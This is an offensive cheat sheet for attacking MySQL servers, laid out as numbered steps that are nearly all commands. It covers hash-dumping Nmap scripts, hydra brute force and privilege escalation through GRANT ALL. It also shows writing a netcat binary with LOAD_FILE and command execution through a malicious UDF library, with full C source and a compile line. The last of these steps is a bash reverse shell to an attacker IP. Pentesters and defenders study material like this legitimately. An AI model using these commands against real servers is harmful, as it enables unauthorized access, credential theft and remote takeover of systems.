# MySQL

Port 3306

### 1) Nmap scan

    nmap -sV -p 3306 --script "mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122" IP

### 2) Netexec


    netexec mysql -d DATABASE -u USERNAME -p PASSWORD -x "SHOW DATABASES;" IP

### 3) Brute force

    hydra -l USER -P PASSWORD_LIST -s 3306 IP mysql

### 4) Login

    mysql -h IP -u USER -p DATABASE

Skip SSL errors

    mysql -h IP -u USER -p --skip_ssl

### 5) Database Usage

    SHOW DATABASES;
    
    USE <database_name>;
    
    SHOW TABLES;
    
    DESCRIBE <table_name>;
    
    SELECT * FROM <table_name>;

### 6) Exploitation

Database enumeration

    SELECT user FROM mysql.user;

Privilege Escalation

    GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
    FLUSH PRIVILEGES;

### 7) Check System permissions of the DB User


#### 1. Copy an already existing file from Windows to another location

    SELECT LOAD_FILE('C:\\xampp\\htdocs\\ncat.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';

#### 2. Check permissions of the new written file

    icacls 'C:\\xampp\htdocs\nc.exe'

#### 3. An output like the one below indicates that the file was written with admin privileges, therefore the DB user has admin privilege (consider WerTrigger exploit for escalation).

    nc.exe WinServer\\apache:(I)(F)  
        NT AUTHORITY\\SYSTEM:(I)(F)  
        BUILTIN\\Administrators:(I)(F)  
        BUILTIN\\Users:(I)(RX)  
    Successfully processed 1 files; Failed processing 0 files

### 8) Command execution via User-Defined Functions (UDFs)

In MySQL, command execution can be achieved via User-Defined Functions (UDFs), if applicable. Here's an example of how to upload a malicious shared object file to gain shell access:

#### 1. Upload UDF library

    mysql -u root -p -h <host> -e "use mysql; create table foo(line blob); insert into foo values(load_file('/path/to/your/udf/lib_mysqludf_sys.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"

#### 2. Create the UDF to execute system commands

    CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';

#### 3. Execute commands

    SELECT sys_exec('id');

#### 4. Reverse shell

    SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');

### 8.1) Compile your own .so for UDF

lib_mysqludf_sys.c

    #include <my_global.h>
    #include <my_sys.h>
    #include <mysql.h>
    #include <stdio.h>
    #include <stdlib.h>
    
    my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
    void sys_exec_deinit(UDF_INIT *initid);
    long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error);
    
    // Initialization function for UDF
    my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
        if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
            strcpy(message, "sys_exec() requires exactly one string argument");
            return 1;
        }
        return 0;
    }
    
    // Cleanup function for UDF
    void sys_exec_deinit(UDF_INIT *initid) {
        // Nothing to do
    }
    
    // Execution function
    long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
        const char *command = args->args[0];
        return system(command);
    }

Compile the .so file into a shared object (.so)

    gcc -Wall -fPIC -I /usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf_sys.c -lc



